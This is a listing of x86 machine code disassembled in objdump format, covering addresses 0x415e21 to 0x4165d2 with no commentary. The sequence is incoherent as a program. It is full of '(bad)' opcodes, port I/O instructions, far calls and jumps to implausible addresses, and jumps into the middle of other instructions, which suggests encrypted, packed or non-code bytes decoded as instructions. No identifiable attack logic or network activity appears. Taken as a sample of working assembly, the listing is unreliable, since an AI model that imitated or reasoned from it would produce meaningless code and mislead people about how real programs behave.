  415e21:	xor    DWORD PTR [ebx-0x7a3d0559],edx
  415e27:	adc    ebx,DWORD PTR [esi]
  415e29:	ss scas eax,DWORD PTR es:[edi]
  415e2b:	rcr    BYTE PTR [edx-0x7adb54d8],1
  415e31:	inc    ebx
  415e32:	popf   
  415e33:	pop    esi
  415e34:	cmp    eax,0x18d1a0fd
  415e39:	repz adc bh,BYTE PTR [edx]
  415e3c:	mov    al,ds:0x3afbcd62
  415e41:	mov    eax,0x99c01f3f
  415e46:	mov    dl,0xeb
  415e48:	pop    ss
  415e49:	call   DWORD PTR [ebx]
  415e4b:	xchg   esi,eax
  415e4c:	inc    ebx
  415e4d:	in     eax,dx
  415e4e:	lahf   
  415e4f:	push   cs
  415e50:	retf   0x9f36
  415e53:	mov    ds:0x89a1c4c7,al
  415e58:	xlat   BYTE PTR ds:[ebx]
  415e59:	jmp    0x415e09
  415e5b:	jg     0x415ed0
  415e5d:	cwde   
  415e5e:	call   DWORD PTR [bx+si+0x26]
  415e62:	out    dx,al
  415e63:	pop    es
  415e64:	sti    
  415e65:	dec    edx
  415e66:	inc    ebx
  415e67:	jle    0x415e5d
  415e69:	jle    0x415ea7
  415e6b:	and    edx,DWORD PTR [ecx+0x780f77f]
  415e71:	out    0xef,eax
  415e73:	loopne 0x415ed3
  415e75:	rcr    DWORD PTR [edi+0x1b880ce3],cl
  415e7b:	(bad)  
  415e7c:	pop    esi
  415e7d:	(bad)  
  415e7e:	xor    eax,0x6528aa36
  415e83:	adc    DWORD PTR [edi+ebp*1+0x630d1adf],0xffffff97
  415e8b:	div    ah
  415e8d:	fdiv   DWORD PTR [eax+0xf]
  415e90:	gs push edi
  415e92:	outs   dx,DWORD PTR ds:[esi]
  415e93:	stos   DWORD PTR es:[edi],eax
  415e94:	jno    0x415e9d
  415e96:	in     eax,0x99
  415e98:	adc    ah,BYTE PTR [edx+eax*1+0x5960f32]
  415e9f:	pop    ebp
  415ea0:	push   es
  415ea1:	outs   dx,DWORD PTR ds:[esi]
  415ea2:	mov    edi,DWORD PTR [ebp+0x63]
  415ea5:	dec    ecx
  415ea6:	hlt    
  415ea7:	jecxz  0x415f08
  415ea9:	cs cwde 
  415eab:	popf   
  415eac:	fistp  DWORD PTR [edi+0x2e]
  415eaf:	adc    al,BYTE PTR [edi]
  415eb1:	mov    esi,0x5ce3a7a4
  415eb6:	pop    esp
  415eb7:	xchg   DWORD PTR [edi+0x13],ebp
  415eba:	fistp  DWORD PTR [ecx-0x5b550bba]
  415ec0:	push   esp
  415ec1:	mov    ch,0x66
  415ec3:	add    eax,0xd576f086
  415ec8:	cld    
  415ec9:	dec    DWORD PTR [esi+esi*8]
  415ecc:	push   es
  415ecd:	dec    esp
  415ece:	jo     0x415ea0
  415ed0:	pop    edi
  415ed1:	jns    0x415edb
  415ed3:	gs out dx,eax
  415ed5:	jl     0x415e77
  415ed7:	xchg   DWORD PTR [ecx],esi
  415ed9:	rcr    BYTE PTR [ebx+0x6499c82a],0x27
  415ee0:	mov    WORD PTR [eax],cs
  415ee2:	lock (bad) 
  415ee4:	sbb    BYTE PTR [edi+0x5ebe75df],al
  415eea:	dec    edx
  415eeb:	pop    es
  415eec:	fidivr WORD PTR [esp+ebx*1]
  415eef:	adc    BYTE PTR [ebx+ecx*8-0x3efe6c31],bl
  415ef6:	mov    cl,0x90
  415ef8:	push   ds
  415ef9:	xchg   ch,ch
  415efb:	cmp    eax,0xcb7d0f1c
  415f00:	dec    esp
  415f01:	fdivr  QWORD PTR [ebx+0x2]
  415f04:	shl    BYTE PTR [ecx-0x57],1
  415f07:	pop    esi
  415f08:	leave  
  415f09:	shr    dl,0x84
  415f0c:	cmp    al,0x96
  415f0e:	aaa    
  415f0f:	ror    DWORD PTR [ebx+eax*1+0x7f093773],0x22
  415f17:	lock jl 0x415ece
  415f1a:	or     DWORD PTR [edx+edi*1+0x6f185fb8],esp
  415f21:	in     al,0x2f
  415f23:	xchg   BYTE PTR [eax-0x9],ch
  415f26:	aaa    
  415f27:	push   ebx
  415f28:	leave  
  415f29:	push   0x53
  415f2b:	cmp    al,0x3f
  415f2d:	idiv   DWORD PTR [esi]
  415f2f:	rcr    eax,1
  415f31:	push   es
  415f32:	xchg   ebp,eax
  415f33:	jg     0x415f11
  415f35:	bound  ecx,QWORD PTR [edi+ebx*2+0x33e77b7f]
  415f3c:	pop    ss
  415f3d:	or     al,0xaf
  415f3f:	(bad)  
  415f40:	dec    edi
  415f41:	push   ds
  415f42:	add    cl,BYTE PTR [edi-0x10]
  415f45:	mov    esi,0x10c8a92f
  415f4a:	jb     0x415fb3
  415f4c:	std    
  415f4d:	lods   al,BYTE PTR ds:[esi]
  415f4e:	lea    edi,[edi]
  415f50:	shr    BYTE PTR [ebp+0x519d3559],cl
  415f56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f57:	aas    
  415f58:	inc    ebp
  415f59:	sub    ah,bh
  415f5b:	mov    ah,0xaf
  415f5d:	push   edx
  415f5e:	pop    es
  415f5f:	mov    bh,0xa6
  415f61:	fsubr  DWORD PTR [eax+0x6f2d2cd7]
  415f67:	gs cli 
  415f69:	mov    esi,0xf7c25d89
  415f6e:	pop    ecx
  415f6f:	cmc    
  415f70:	iret   
  415f71:	jo     0x415f02
  415f73:	inc    ebx
  415f74:	jns    0x415f41
  415f76:	push   DWORD PTR [ebx+0x3b]
  415f79:	inc    edi
  415f7a:	sbb    bh,al
  415f7c:	sbb    DWORD PTR [edi],esi
  415f7e:	add    DWORD PTR [edx-0x320f1ec],edx
  415f84:	mov    esp,0x61b3366e
  415f89:	in     al,0x47
  415f8b:	int3   
  415f8c:	mov    ds:0xacdaa01a,al
  415f91:	int    0x90
  415f93:	retf   0xc01e
  415f96:	jp     0x415f4a
  415f98:	retf   0xd06a
  415f9b:	cmp    DWORD PTR [ecx+0x44254661],edx
  415fa1:	scas   eax,DWORD PTR es:[edi]
  415fa2:	add    eax,0xddb570f
  415fa7:	ret    0x8b09
  415faa:	xchg   ecx,eax
  415fab:	or     esp,edi
  415fad:	test   eax,0x4d6fe9cf
  415fb2:	std    
  415fb3:	lahf   
  415fb4:	adc    esp,esp
  415fb6:	adc    eax,0x92e1e299
  415fbb:	push   ebx
  415fbc:	mov    esp,0x93fa7713
  415fc1:	imul   edx,DWORD PTR [edi+0x78],0x2b
  415fc5:	mov    ss,WORD PTR [edx+0x298c7e17]
  415fcb:	ss sbb al,0x6f
  415fce:	push   ecx
  415fcf:	in     al,dx
  415fd0:	outs   dx,DWORD PTR ds:[esi]
  415fd1:	call   0xd0594447
  415fd6:	popf   
  415fd7:	sar    BYTE PTR [edi-0x49],0x10
  415fdb:	out    0x55,al
  415fdd:	shl    DWORD PTR [ebx+0xc],0x94
  415fe1:	add    ch,bl
  415fe3:	push   esi
  415fe4:	lods   eax,DWORD PTR ds:[esi]
  415fe5:	pop    esp
  415fe6:	mul    BYTE PTR [edi]
  415fe8:	sahf   
  415fe9:	dec    ebx
  415fea:	lock pusha 
  415fec:	imul   edx,DWORD PTR [ebp+0x67],0x52faeaca
  415ff3:	pop    edx
  415ff4:	mov    ebx,esp
  415ff6:	(bad)  
  415ff8:	mov    ah,0x77
  415ffa:	arpl   WORD PTR [esi+0x70e5b9d3],sp
  416000:	lods   al,BYTE PTR ds:[esi]
  416001:	(bad)  
  416002:	in     eax,dx
  416003:	out    0x8c,eax
  416005:	shr    bl,1
  416007:	xchg   ebx,eax
  416008:	add    eax,0xf906e663
  41600d:	xchg   edx,eax
  41600e:	mov    ebp,0x3bc879f5
  416013:	fstp   TBYTE PTR [esi+esi*4-0x4b]
  416017:	hlt    
  416018:	inc    eax
  416019:	push   edx
  41601a:	mov    bh,BYTE PTR [esi+ebp*8]
  41601d:	xchg   edi,eax
  41601e:	dec    ebp
  41601f:	aam    0xbd
  416021:	xlat   BYTE PTR ds:[ebx]
  416022:	mov    DWORD PTR [esi+0x78c10345],edx
  416028:	rol    DWORD PTR [esi+ecx*2],1
  41602b:	lds    eax,FWORD PTR [ecx+0x3d9c418b]
  416031:	dec    ebx
  416032:	pushf  
  416033:	outs   dx,BYTE PTR ds:[esi]
  416034:	test   edi,ecx
  416036:	cli    
  416037:	(bad)  
  416038:	cmp    esi,DWORD PTR [ebp-0x2a8998f5]
  41603e:	pop    esi
  41603f:	ret    
  416040:	pop    ebx
  416041:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416042:	mov    eax,ds:0x35ac9ad0
  416047:	jge    0x4160a4
  416049:	shl    DWORD PTR [ebp+0x3a],0x5e
  41604d:	mov    bl,0xa4
  41604f:	sub    eax,0x882a76fd
  416054:	xor    al,0xf2
  416056:	sbb    eax,0xdeee5ec2
  41605b:	add    BYTE PTR [edx],bh
  41605d:	mov    dl,ah
  41605f:	push   ecx
  416060:	mov    eax,esp
  416062:	jmp    0x4160bb
  416064:	sbb    DWORD PTR [edi],edi
  416066:	xlat   BYTE PTR ds:[ebx]
  416067:	sbb    DWORD PTR [ebx],edi
  416069:	mov    BYTE PTR [eax+0x4c],bl
  41606c:	mov    ah,0x21
  41606e:	mov    dl,0x76
  416070:	ins    BYTE PTR es:[edi],dx
  416071:	or     BYTE PTR [edx+esi*1-0x4be7e017],0x8a
  416079:	sub    eax,0x44f89f04
  41607e:	cmp    ah,BYTE PTR [edx]
  416080:	test   BYTE PTR [edi+0x22262f82],bh
  416086:	fimul  WORD PTR [ebp-0x1539d69f]
  41608c:	call   0x19f2347d
  416091:	not    edi
  416093:	mov    al,ds:0xb95ba68d
  416098:	fld    DWORD PTR [esi]
  41609a:	mov    ds:0xa01db7bd,al
  41609f:	mov    ebx,0x26a583f6
  4160a4:	jecxz  0x416094
  4160a6:	xchg   ecx,eax
  4160a7:	mov    bl,0xeb
  4160a9:	sub    al,0x3c
  4160ab:	ret    
  4160ac:	mov    esi,0x63a173ac
  4160b1:	and    eax,0x2be0709a
  4160b6:	das    
  4160b7:	jbe    0x4160ff
  4160b9:	jo     0x416056
  4160bb:	lahf   
  4160bc:	xchg   ebx,eax
  4160bd:	push   edx
  4160be:	imul   esp,DWORD PTR [eax],0x5161c75a
  4160c4:	xor    al,0xd2
  4160c6:	inc    ebp
  4160c7:	shl    BYTE PTR [ebx+0x42547699],1
  4160cd:	gs ret 
  4160cf:	and    eax,0xb1fbc32e
  4160d4:	xor    al,dl
  4160d6:	or     al,0x1e
  4160d8:	push   ecx
  4160d9:	out    dx,eax
  4160da:	xchg   edi,ebp
  4160dc:	rcr    dl,cl
  4160de:	cwde   
  4160df:	cmc    
  4160e0:	loope  0x416144
  4160e2:	je     0x416122
  4160e4:	xchg   DWORD PTR [eax-0x6],ebx
  4160e7:	outs   dx,BYTE PTR ds:[esi]
  4160e8:	mov    ch,0xd2
  4160ea:	add    eax,0x194d7352
  4160ef:	aam    0x46
  4160f1:	mov    esi,0xc514b8ec
  4160f6:	in     al,dx
  4160f7:	sub    DWORD PTR [eax+ebp*4-0xe],ebp
  4160fb:	out    dx,al
  4160fc:	(bad)  
  4160fd:	fld    TBYTE PTR [eax+esi*4]
  416100:	lds    ebx,FWORD PTR [edx+ecx*4-0x47]
  416104:	(bad)  
  416105:	mov    ds:0x47b1f843,eax
  41610a:	mov    eax,ds:0xef84534
  41610f:	cmc    
  416110:	arpl   WORD PTR [eax+eiz*1+0x2b1ef9ff],si
  416117:	sub    ebx,edi
  416119:	loopne 0x4160ae
  41611b:	xor    al,0xd4
  41611d:	adc    ecx,DWORD PTR [esi+0x3a4ab527]
  416123:	out    0x27,eax
  416125:	test   eax,0x705499ae
  41612a:	dec    edi
  41612b:	xor    bl,BYTE PTR [ecx+0x26]
  41612e:	fidiv  WORD PTR [eax-0x4e]
  416131:	adc    al,ah
  416133:	mov    cl,0x93
  416135:	in     eax,dx
  416136:	shr    BYTE PTR [edx-0x2e],0xfc
  41613a:	jb     0x416182
  41613c:	daa    
  41613d:	(bad)  
  41613e:	loopne 0x416169
  416140:	add    al,0xb5
  416142:	ins    DWORD PTR es:[edi],dx
  416143:	daa    
  416144:	(bad)  
  416145:	mov    edx,0xb3bee4c8
  41614a:	aas    
  41614b:	je     0x4160ed
  41614d:	jo     0x4161b4
  41614f:	add    al,0x8c
  416151:	into   
  416152:	or     DWORD PTR [edi-0x38d01783],edx
  416158:	repz js 0x4160e0
  41615b:	jns    0x416111
  41615d:	sahf   
  41615e:	mov    ds:0xb8ce2d18,eax
  416163:	popa   
  416164:	mov    esi,0x151535f8
  416169:	inc    ebx
  41616a:	dec    eax
  41616b:	fwait
  41616c:	stos   DWORD PTR es:[edi],eax
  41616d:	cmp    al,0xbb
  41616f:	sbb    ebp,DWORD PTR [ecx+0x4a]
  416172:	fiadd  WORD PTR [eax]
  416174:	jg     0x4161d0
  416176:	or     edi,ecx
  416178:	or     eax,0xb01d129d
  41617d:	push   ebp
  41617e:	dec    ebp
  41617f:	push   0x90530e01
  416184:	dec    edi
  416185:	pop    si
  416187:	mov    DWORD PTR [edi],ecx
  416189:	ds push ss
  41618b:	retf   
  41618c:	fs js  0x4161f4
  41618f:	outs   dx,DWORD PTR ds:[esi]
  416190:	hlt    
  416191:	fcomp  QWORD PTR [eax-0x5fca14fc]
  416197:	sahf   
  416198:	fdivr  DWORD PTR [eax-0xd522ecf]
  41619e:	in     al,0x73
  4161a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161a1:	add    BYTE PTR [ebp+0x71],bh
  4161a4:	fadd   DWORD PTR [esi+0x736ce104]
  4161aa:	pop    edi
  4161ab:	ds stos BYTE PTR es:[di],al
  4161ae:	(bad)  
  4161af:	pusha  
  4161b0:	sbb    esi,eax
  4161b2:	xor    eax,0x6b44bd3c
  4161b7:	fwait
  4161b8:	clc    
  4161b9:	pop    es
  4161ba:	pop    ebp
  4161bb:	jo     0x4161ba
  4161bd:	loopne 0x4161b2
  4161bf:	scas   eax,DWORD PTR es:[edi]
  4161c0:	sbb    eax,0x15b7f934
  4161c5:	ja     0x416147
  4161c7:	lds    esi,FWORD PTR [ecx+0x75c1d5e3]
  4161cd:	jb     0x41620d
  4161cf:	dec    edx
  4161d0:	jnp    0x416157
  4161d2:	loope  0x416156
  4161d4:	lahf   
  4161d5:	inc    edi
  4161d6:	and    esp,ebx
  4161d8:	lds    esi,FWORD PTR [eax+edi*2-0x16]
  4161dc:	jmp    DWORD PTR [ebx-0x43576736]
  4161e2:	(bad)
  4161e5:	je     0x41622a
  4161e7:	dec    ebx
  4161e8:	mov    ds,WORD PTR [edx-0x3]
  4161eb:	and    BYTE PTR [ebx],bl
  4161ed:	std    
  4161ee:	or     eax,0xd3565336
  4161f3:	xchg   BYTE PTR [ecx],ch
  4161f5:	test   BYTE PTR [ebp+0x2d78fabb],dh
  4161fb:	std    
  4161fc:	xor    ah,ch
  4161fe:	and    al,BYTE PTR [edi+0x278c2a11]
  416204:	out    0xa3,al
  416206:	xchg   BYTE PTR [ebp+edx*4+0x5b],dh
  41620a:	and    DWORD PTR [edx+0x17fa5edb],0x3a
  416211:	and    DWORD PTR [esi-0x24],ebx
  416214:	cli    
  416215:	idiv   DWORD PTR [edx-0x1e803ac6]
  41621b:	xchg   ebx,eax
  41621c:	loop   0x416288
  41621e:	sbb    BYTE PTR [edi-0x64930d1c],ch
  416224:	test   ecx,edx
  416226:	pop    ebx
  416227:	push   0x9f52fefe
  41622c:	inc    esp
  41622d:	bound  ecx,QWORD PTR [edx+eax*4-0x26]
  416231:	retf   0x7665
  416234:	jge    0x416217
  416236:	mov    eax,ds:0xf28b46eb
  41623b:	inc    ebp
  41623c:	inc    DWORD PTR [edi]
  41623e:	pop    ebx
  41623f:	imul   esi,DWORD PTR [eax+0x51],0x1dad3aa4
  416246:	pop    edx
  416247:	cmc    
  416248:	enter  0xf672,0xa1
  41624c:	test   al,0xaa
  41624e:	mov    ds:0xbab31ba9,al
  416253:	cmp    ecx,edx
  416255:	inc    eax
  416256:	outs   dx,DWORD PTR ds:[esi]
  416257:	faddp  st(5),st
  416259:	(bad)  
  41625a:	arpl   WORD PTR [ebp-0x48],dx
  41625d:	es mov bh,0x83
  416260:	ins    DWORD PTR es:[edi],dx
  416261:	add    esi,esi
  416263:	sbb    BYTE PTR ds:0x572d8d30,0x45
  41626a:	push   edi
  41626b:	fs sahf 
  41626d:	xchg   ebx,eax
  41626e:	ret    
  41626f:	in     eax,0x15
  416271:	push   ds
  416272:	ins    BYTE PTR es:[edi],dx
  416273:	repz xchg edx,eax
  416275:	mov    cl,0xff
  416277:	stos   BYTE PTR es:[edi],al
  416278:	call   0x393712c
  41627d:	ret    
  41627e:	scas   eax,DWORD PTR es:[edi]
  41627f:	adc    BYTE PTR [eax],ch
  416281:	repnz retf 0x3ec1
  416285:	cmp    al,0x86
  416287:	and    BYTE PTR [edi],0x8d
  41628a:	sar    eax,1
  41628c:	pop    esp
  41628d:	cs gs and esi,edi
  416291:	cmp    BYTE PTR [edx],0xe8
  416294:	push   ebx
  416295:	xchg   cl,dh
  416297:	ja     0x41623a
  416299:	fdiv   st(4),st
  41629b:	lahf   
  41629c:	jp     0x4162b3
  41629e:	dec    eax
  41629f:	dec    BYTE PTR [ebx]
  4162a1:	(bad)  
  4162a2:	dec    edx
  4162a3:	fiadd  DWORD PTR [edi]
  4162a5:	push   edi
  4162a6:	pushf  
  4162a7:	int3   
  4162a8:	icebp  
  4162a9:	sub    DWORD PTR [ebp+0x78],ebp
  4162ac:	pushw  ss
  4162ae:	pushf  
  4162af:	xchg   edx,eax
  4162b0:	retf   0x4493
  4162b3:	xchg   ebp,eax
  4162b4:	and    al,0x33
  4162b6:	xchg   ecx,ebp
  4162b8:	ds jns 0x4162e8
  4162bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162bc:	mov    eax,0x39e6d9f8
  4162c1:	mov    ds:0xad4b3dee,eax
  4162c6:	dec    esi
  4162c7:	out    0x14,al
  4162c9:	sub    bl,BYTE PTR [ecx+0x10f7d6bb]
  4162cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162d0:	pop    edi
  4162d1:	call   0x4cb1:0xcf47a1ad
  4162d8:	inc    ecx
  4162d9:	add    BYTE PTR [eax+0x18],al
  4162dc:	dec    ecx
  4162dd:	pop    ebx
  4162de:	call   0x4b57:0x9e8419fd
  4162e5:	outs   dx,DWORD PTR ds:[esi]
  4162e6:	daa    
  4162e7:	xor    ebx,DWORD PTR [esi]
  4162e9:	mov    dl,0xbf
  4162eb:	mov    ds:0xa30ac941,eax
  4162f0:	mov    al,BYTE PTR [edi+0x69aacd53]
  4162f6:	out    dx,eax
  4162f7:	sti    
  4162f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162f9:	sbb    eax,0xc812980f
  4162fe:	jge    0x41632c
  416300:	call   0x1d81:0xa3c82874
  416307:	xlat   BYTE PTR ds:[ebx]
  416308:	sub    edi,DWORD PTR ds:0x5db92308
  41630e:	data16 jne 0x416372
  416311:	out    dx,al
  416312:	popa   
  416313:	rcr    DWORD PTR [ebx+0x7b0aa78],cl
  416319:	adc    eax,0x2778f416
  41631e:	or     eax,0x6cb531
  416323:	xor    edi,esi
  416325:	add    al,0xd0
  416327:	fistp  QWORD PTR [ebx]
  416329:	xchg   edi,eax
  41632a:	and    BYTE PTR [ebp-0x5eb7a256],ah
  416330:	mov    WORD PTR [edx],ss
  416332:	aaa    
  416333:	fild   DWORD PTR [ecx-0x3ceb0064]
  416339:	dec    eax
  41633a:	pusha  
  41633b:	lock clc 
  41633d:	xor    ah,BYTE PTR [ebx+0x2303c887]
  416343:	std    
  416344:	jecxz  0x4163af
  416346:	dec    ebp
  416347:	xchg   ebx,eax
  416348:	or     dh,BYTE PTR [ebp+0x79440c5f]
  41634e:	mov    esi,0x5593f785
  416353:	sti    
  416354:	into   
  416355:	in     al,dx
  416356:	adc    DWORD PTR [ebp+0x70],esi
  416359:	popa   
  41635a:	xchg   ebp,eax
  41635b:	arpl   WORD PTR [ebp+0x22],cx
  41635e:	imul   eax,DWORD PTR [ebp+0x7d],0x79
  416362:	jmp    0xff9b:0xd1b31a5d
  416369:	xchg   ebx,eax
  41636a:	or     BYTE PTR [edi-0x11],cl
  41636d:	into   
  41636e:	ss dec ebx
  416370:	pop    esp
  416371:	xor    dh,BYTE PTR ds:0x92d72087
  416377:	(bad)  
  416378:	out    0x97,eax
  41637a:	jp     0x41638d
  41637c:	jnp    0x4163fa
  41637e:	push   es
  41637f:	int    0xd4
  416381:	mov    ss,edx
  416383:	loope  0x416366
  416385:	mov    bl,0xfb
  416387:	mov    BYTE PTR [edi],cl
  416389:	push   ss
  41638a:	add    al,bh
  41638c:	mov    WORD PTR [esi+esi*1-0x71d36cf9],?
  416393:	test   al,0xd5
  416395:	and    dl,cl
  416397:	sbb    ebp,DWORD PTR [edx-0x4f64e862]
  41639d:	out    0x90,al
  41639f:	jmp    0x7f903dd
  4163a4:	retf   
  4163a5:	cmc    
  4163a6:	and    al,0x10
  4163a8:	mov    ah,0x14
  4163aa:	pusha  
  4163ab:	jno    0x416389
  4163ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163ae:	lods   al,BYTE PTR ds:[esi]
  4163af:	mov    dl,0xf3
  4163b1:	jge    0x41639d
  4163b3:	cwde   
  4163b4:	fidiv  WORD PTR [eax+0x4c942416]
  4163ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163bb:	fldcw  WORD PTR [edx]
  4163bd:	test   eax,0xc80a1a41
  4163c2:	loope  0x416384
  4163c4:	push   ebx
  4163c5:	lea    ecx,[esp+ecx*2-0x13]
  4163c9:	aaa    
  4163ca:	mov    ebx,0x3fa25513
  4163cf:	nop
  4163d0:	jns    0x416374
  4163d2:	xchg   ebx,eax
  4163d3:	mov    ch,BYTE PTR [edi]
  4163d5:	(bad)  
  4163d7:	push   0xffffffe2
  4163d9:	imul   ebx,DWORD PTR [esi-0x2b482195],0xc244fefc
  4163e3:	adc    dl,BYTE PTR [ebx]
  4163e5:	adc    dl,0xb8
  4163e8:	int    0x4d
  4163ea:	adc    al,0x82
  4163ec:	pop    ebx
  4163ed:	sub    edx,esp
  4163ef:	sbb    ebp,eax
  4163f1:	dec    ebx
  4163f2:	cmp    eax,0xed4ec07d
  4163f7:	xor    al,BYTE PTR [edx]
  4163f9:	pop    ebx
  4163fa:	add    ah,BYTE PTR [esi+0x43]
  4163fd:	dec    ebx
  4163fe:	lds    ebp,FWORD PTR ds:0x64675edd
  416404:	push   ds
  416405:	ja     0x416444
  416407:	ret    
  416408:	fcom   QWORD PTR [edi+0xe]
  41640b:	cmc    
  41640c:	push   ebp
  41640d:	sub    BYTE PTR [eax+0x76],bl
  416410:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416411:	pop    ss
  416412:	dec    esp
  416413:	dec    edx
  416414:	pop    ebp
  416415:	dec    edi
  416416:	add    edx,ebx
  416418:	sbb    BYTE PTR [ebx+0x5],0xd9
  41641c:	cli    
  41641d:	test   BYTE PTR [ebx+esi*4+0x2a186d4f],0xc4
  416425:	ins    BYTE PTR es:[edi],dx
  416426:	jnp    0x41648b
  416428:	sbb    esi,ebp
  41642a:	adc    BYTE PTR [edi-0x41],cl
  41642d:	mov    ds,WORD PTR [esp+esi*1]
  416430:	xchg   esp,eax
  416431:	dec    eax
  416432:	push   esi
  416433:	test   BYTE PTR [edi-0x76],ch
  416436:	sti    
  416437:	cs pop es
  416439:	adc    ah,BYTE PTR fs:[ecx]
  41643c:	ins    DWORD PTR es:[edi],dx
  41643d:	push   edi
  41643e:	add    al,ah
  416440:	mov    dl,0xe
  416442:	outs   dx,DWORD PTR ds:[esi]
  416443:	and    esi,esp
  416445:	xor    BYTE PTR [ebx+0x4c],cl
  416448:	mov    esp,0x4c9a9677
  41644d:	xor    esp,edx
  41644f:	xchg   DWORD PTR [edx-0x3f00ffe9],ecx
  416455:	bound  esi,QWORD PTR [ebx]
  416457:	das    
  416458:	pop    ss
  416459:	dec    edi
  41645a:	adc    ah,dl
  41645c:	mov    ebx,0x46b56fcc
  416461:	das    
  416462:	ins    BYTE PTR es:[edi],dx
  416463:	rol    edx,0x24
  416466:	and    DWORD PTR [ebx+0x75],ebx
  416469:	push   ebp
  41646a:	jae    0x4164c6
  41646c:	dec    ebx
  41646d:	sbb    eax,0xad597c57
  416472:	and    eax,0xbcf571cb
  416477:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416478:	rol    BYTE PTR [edx+0x11],cl
  41647b:	jae    0x41641b
  41647d:	xor    bl,BYTE PTR ds:0x52aec2b7
  416483:	lock repz inc esi
  416486:	gs je  0x41641b
  416489:	mov    ah,0xa1
  41648b:	sub    BYTE PTR [ebp+0x27],dl
  41648e:	mov    edi,0x60bb73bc
  416493:	inc    ebx
  416494:	push   0xffffff9b
  416496:	pusha  
  416497:	inc    eax
  416498:	inc    edx
  416499:	fdiv   st(4),st
  41649b:	lds    eax,FWORD PTR [ecx]
  41649d:	push   0xf6472b63
  4164a2:	(bad)  
  4164a3:	sub    DWORD PTR [ecx+0x70],edi
  4164a6:	inc    ebx
  4164a7:	inc    eax
  4164a8:	and    eax,0x6e6d5eb1
  4164ad:	stc    
  4164ae:	jecxz  0x416492
  4164b0:	lods   al,BYTE PTR ds:[esi]
  4164b1:	jmp    0x3e59:0x4708c690
  4164b8:	xor    esp,DWORD PTR [esi+0xa57c9a9]
  4164be:	lods   eax,DWORD PTR ds:[esi]
  4164bf:	jmp    ecx
  4164c1:	cmc    
  4164c2:	inc    ebx
  4164c3:	jno    0x416458
  4164c5:	into   
  4164c6:	test   DWORD PTR [edi],esp
  4164c8:	add    ebx,ecx
  4164ca:	stos   BYTE PTR es:[edi],al
  4164cb:	rol    BYTE PTR [edi-0x6a],0xb4
  4164cf:	sbb    BYTE PTR [eax-0x6f],bh
  4164d2:	dec    eax
  4164d3:	(bad)  
  4164d4:	stc    
  4164d5:	jbe    0x4164a6
  4164d7:	mov    dl,0x77
  4164d9:	ds push ebx
  4164db:	xchg   cl,bh
  4164dd:	repnz add bh,0x89
  4164e1:	fwait
  4164e2:	out    0xb6,eax
  4164e4:	sahf   
  4164e5:	imul   esi,esi,0x7e
  4164e8:	jne    0x4164a4
  4164ea:	mov    bh,0x1d
  4164ec:	stc    
  4164ed:	fild   DWORD PTR [edi-0x1d]
  4164f0:	jae    0x4164ee
  4164f2:	out    0xbc,eax
  4164f4:	jns    0x4164d6
  4164f6:	fadd   st,st(1)
  4164f8:	adc    ebp,DWORD PTR [edx+ebx*1+0x663ff0b]
  4164ff:	inc    ebx
  416500:	sub    al,0x41
  416502:	sbb    al,0xb3
  416504:	xor    esi,DWORD PTR [edx-0x10]
  416507:	jns    0x41648b
  416509:	popf   
  41650a:	ss sbb al,0xb7
  41650d:	fist   DWORD PTR [esi+0x30]
  416510:	jmp    0xfc41d381
  416515:	xor    DWORD PTR [esi+ebx*4+0x65],edi
  416519:	jae    0x4164fa
  41651b:	mov    edx,0x9b29fa0a
  416520:	mov    DWORD PTR [eax-0x3ea93445],ecx
  416526:	or     eax,0x2b0bde5a
  41652b:	jg     0x416557
  41652d:	xchg   ebx,eax
  41652e:	inc    ebx
  41652f:	jmp    0x41656d
  416531:	jle    0x4164b5
  416533:	(bad)  
  416534:	ficomp DWORD PTR ds:0x9b8accad
  41653a:	inc    ebx
  41653b:	push   ds
  41653c:	nop
  41653d:	jbe    0x4164ca
  41653f:	sbb    ebp,edi
  416541:	dec    ebp
  416542:	shl    DWORD PTR [edi+0x23],1
  416545:	cmp    BYTE PTR [ecx-0x5e],ah
  416548:	mov    eax,0xd9d73949
  41654d:	sbb    eax,0x3a3f8558
  416552:	inc    ecx
  416553:	sahf   
  416554:	mov    bh,0x67
  416556:	xchg   DWORD PTR [esi-0x41],esp
  416559:	cmp    bh,BYTE PTR [eax-0x57]
  41655c:	add    BYTE PTR [eax*8-0xa510797],0xe
  416564:	arpl   WORD PTR [esi],bx
  416566:	loopne 0x4164fb
  416568:	mov    DWORD PTR [eax+0x553b8497],ecx
  41656e:	xchg   ecx,eax
  41656f:	ss pop esp
  416571:	jl     0x416575
  416573:	dec    edi
  416574:	mov    ebx,0x7ea5fbd6
  416579:	inc    edi
  41657a:	jmp    0x41653e
  41657c:	mov    ch,0xcc
  41657e:	and    eax,0xae7e5fe9
  416583:	lods   al,BYTE PTR ds:[esi]
  416584:	shl    BYTE PTR [ebx-0xf53fdfb],cl
  41658a:	imul   esi,DWORD PTR [edx-0x74],0x7d
  41658e:	push   edx
  41658f:	out    0x95,eax
  416591:	lds    ebp,FWORD PTR [edi+0x74]
  416594:	or     al,0x9
  416596:	adc    ebp,DWORD PTR [ebp-0x729051fb]
  41659c:	aaa    
  41659d:	mov    bh,0x18
  41659f:	in     eax,0x92
  4165a1:	out    0xe6,eax
  4165a3:	jg     0x4165db
  4165a5:	push   ebx
  4165a6:	idiv   DWORD PTR [ecx+0x4e]
  4165a9:	out    0xbb,al
  4165ab:	inc    edx
  4165ac:	xchg   edx,ecx
  4165ae:	in     al,dx
  4165af:	mov    dl,BYTE PTR [eiz*4-0x91a1a32]
  4165b6:	push   edi
  4165b7:	push   esi
  4165b8:	in     eax,dx
  4165b9:	ds pop ds
  4165bb:	jmp    0x7357282e
  4165c0:	push   ss
  4165c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165c2:	cli    
  4165c3:	mov    ah,0xc5
  4165c5:	add    BYTE PTR [ebx+0x6a],al
  4165c8:	scas   eax,DWORD PTR es:[edi]
  4165c9:	addr16 pusha 
  4165cb:	repnz rcl DWORD PTR [esi+eax*1+0x2d],1
  4165d0:	test   al,0x16
  4165d2:	add    al,0x19
